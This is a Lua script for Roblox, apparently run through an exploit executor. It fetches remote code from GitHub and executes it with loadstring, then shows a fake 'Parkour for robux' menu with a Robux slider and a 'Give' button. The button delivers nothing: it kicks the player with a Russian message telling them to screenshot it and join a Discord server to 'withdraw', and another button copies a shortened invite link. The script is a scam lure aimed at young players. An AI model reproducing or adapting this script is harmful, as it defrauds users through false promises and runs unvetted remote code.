local function urlLoad(url)
    local success, result = pcall(game.HttpGet, game, url)
    if (not success) then
        return fail(string.format('Failed to GET url %q for reason: %q', url, tostring(result)))
    end

    local fn, err = loadstring(result)
    if (type(fn) ~= 'function') then
        return fail(string.format('Failed to loadstring url %q for reason: %q', url, tostring(err)))
    end

    local results = { pcall(fn) }
    if (not results[1]) then
        return fail(string.format('Failed to initialize url %q for reason: %q', url, tostring(results[2])))
    end

    return unpack(results, 2)
end

-- ^^^ cool part 

local library = urlLoad("https://raw.githubusercontent.com/wally-rblx/uwuware-ui/main/main.lua")

do
    if shared._unload then
        pcall(shared._unload)
    end

    function shared._unload()
        if shared._id then
            pcall(runService.UnbindFromRenderStep, runService, shared._id)
        end

        if library.open then
            library:Close()
        end

        library.base:ClearAllChildren()
        library.base:Destroy()
    end
end


local localplayer = game.Players.LocalPlayer
local nickname = localplayer.Name
local id = localplayer.UserId

local checkid = math.random(500000, 599999)

local function closegui()
	library.base:ClearAllChildren()
    library.base:Destroy()
end

local function copyinvite()
	setclipboard("https://gg.gg/bunk3r")
end

local function cardgiver()
localplayer:Kick("\n !!!!! ЧИТАЙ ВНИМАТЕЛЬНО !!!!! \n Статистика: \n Имя: "..nickname.." \n ID: "..id.." \n На вывод (с учётом всех комиссий): \n ".._G.number.." \n Для того, чтобы продолжить, тебе нужно \n сделать скриншот и затем зайти в наш дискорд \n сервер. Вот приглашение: Y565RGq8AD. После \n этого, прочитай как-вывести")
end

do
local window = library:CreateWindow('Parkour for robux')
local folder = window:AddFolder('Script')
folder:AddButton({text = "Give", callback = function() cardgiver() end})
folder:AddSlider({text = 'Robux count', min = 1, max = 999, callback = function(v) _G.number = v end})
window:AddDivider()
window:AddButton({text = "Copy Discord", flag = "button", callback = function() copyinvite() end})
window:AddButton({text = "Unload Script", flag = "button", callback = function() closegui() end})
end
library:Init()
